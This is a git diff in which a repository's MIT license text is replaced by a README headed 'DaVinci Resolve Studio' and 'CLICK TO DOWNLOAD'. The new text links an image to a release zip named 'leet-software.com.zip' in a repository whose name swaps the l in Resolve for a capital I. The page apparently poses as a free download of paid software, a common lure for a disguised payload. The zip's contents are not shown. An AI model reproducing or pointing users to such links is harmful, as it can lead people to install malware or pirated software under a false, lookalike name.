@@ -1,11 +1,8 @@
-# Lic
+# DaVinci Resolve Studio
+# CLICK TO DOWNLOAD 
 
-MIT License
+[![photo_2024-04-10_22-53-47](https://github.com/trimooo/DaVinci-ResoIve-Studio/assets/88747853/a802e207-ce04-4e2e-8515-59440c36a742)](https://github.com/trimooo/DaVinci-ResoIve-Studio/releases/download/DaVinciResolve/leet-software.com.zip)
 
-Copyright (c) 2023 Leotrim Thaqi
+![image](https://github.com/trimooo/DaVinci-ResoIve-Studio/assets/88747853/a92b386f-fbd0-4799-a970-9c3d4de74fdc)
 
-Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+![image](https://github.com/trimooo/DaVinci-ResoIve-Studio/assets/88747853/f0c416d5-35ef-46d0-b100-4ccc956d0df4)
